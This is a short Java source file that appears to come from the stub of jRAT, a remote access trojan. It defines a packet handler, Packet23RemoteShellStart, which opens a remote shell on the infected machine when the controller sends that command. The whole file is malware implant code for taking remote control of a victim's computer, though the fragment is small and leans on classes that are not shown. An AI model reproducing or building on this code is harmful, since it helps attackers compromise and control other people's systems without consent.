package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.RemoteShell;

public class Packet23RemoteShellStart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new RemoteShell(con).start();
	}

}
